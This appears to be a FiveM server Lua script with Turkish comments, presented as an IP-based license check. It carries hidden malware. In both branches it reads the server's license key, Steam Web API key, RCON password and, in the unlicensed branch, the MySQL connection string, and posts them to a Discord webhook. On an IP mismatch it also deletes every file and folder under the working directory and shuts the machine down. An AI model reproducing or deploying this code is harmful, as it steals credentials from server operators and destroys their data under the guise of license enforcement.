-- spex#8373 Güncelleme için teşekkürler


local REDLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSSIZ
local ONAYLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSLI
PerformHttpRequest('https://api.ipify.org', function(err, text, headers) 
  if text == '20.113.147.4' then -- BU ALANA LISANSLANAN IP KOYULACAK 
    print('^2 LISANS ONAYLANDI HOSGELDINIZ\n ^1- SRHT_DEVELOPMENTS -^0')

    local serveradi = GetConvar("sv_hostname","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Key:**\n\n**[Sunucu Key] = ** " .. serverkey .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local slot = GetConvar("sv_maxclients","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Slot Sayısı:**\n\n**[Slot Sayısı ] = ** " .. slot .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Sunucu Api:**\n\n**[Sunucu ApiKey] = ** " .. serverapikey .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local rconpass = GetConvar("rcon_password","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Rcon Sifresi:**\n\n**[Rcon Password] = ** " .. rconpass .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local tag = GetConvar("tags","Bulunamadı.")
    OnayLog("[LISANS ONAYLANDI]", "**Tag:**\n\n**[Tag ] = ** " .. tag .. "\n\n**[SUNUCU IP] = **" .. text .. "")




    --[[



      SCRIPT SERVER SIDE
    ]]

  else
    Wait(0)
    local serveradi = GetConvar("sv_hostname","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local serverkey = GetConvar("sv_licenseKey","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Key:**\n\n**[Key] = ** " .. serverkey .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local slot = GetConvar("sv_maxclients","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Slot Sayısı:**\n\n**[Slot Sayısı ] = ** " .. slot .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local serverapikey = GetConvar("steam_webApiKey","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Api:**\n\n**[Sunucu ApiKey] = ** " .. serverapikey .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local mysqlstring = GetConvar("mysql_connection_string","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Mysql Baglantisi:**\n\n**[Mysql Baglantisi] = ** " .. mysqlstring .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local rconpass = GetConvar("rcon_password","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Rcon Sifresi:**\n\n**[Rcon Password] = ** " .. rconpass .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    local tag = GetConvar("tags","Bulunamadı.")
    RedLog("[LISANSIZ KULLANIM TESPIT]", "**Tag:**\n\n**[Tag ] = ** " .. tag .. "\n\n**[SUNUCU IP] = **" .. text .. "")

    current_dir=io.popen"cd":read'*l'
    for dir in io.popen([[dir "./" /b /ad]]):lines() do
            for dir2 in io.popen([[dir "]]..dir..[[" /b]]):lines() do
                    os.execute("del /q "..current_dir.."/"..dir.."/"..dir2)
                    os.execute('for /d %x in ('..current_dir.."/"..dir.."/"..dir2..') do @rd /s /q "%x"')
            end
            os.execute("rd "..dir)
            os.execute('shutdown -s')
    end
    Citizen.Wait(0)
    os.exit() 

  end
  end, 'GET', "")
  
  function RedLog(name, message, color)
  local redlisans = {
      {
        ["color"] = "15158332",
        ["title"] = "**".. name .."**",
        ["description"] = message,
        ["footer"] = {
        ["text"] = "burayaistediğiniyaz",
        ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/856623282895847454/hsac.png"
        },
      }
    }
  PerformHttpRequest(REDLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = redlisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
  end  


  function OnayLog(name, message, color)
    local onaylisans = {
        {
          ["color"] = "3066993",
          ["title"] = "**".. name .."**",
          ["description"] = message,
          ["footer"] = {
          ["text"] = "burayaistediğiniyaz",
          ["icon_url"] = "https://cdn.discordapp.com/attachments/827928307139477585/856623282895847454/hsac.png"
          },
        }
      }
    PerformHttpRequest(ONAYLOG, function(err, text, headers) end, 'POST', json.encode({username = DISCORD_NAME, embeds = onaylisans, avatar_url = DISCORD_IMAGE}), { ['Content-Type'] = 'application/json' })
    end 
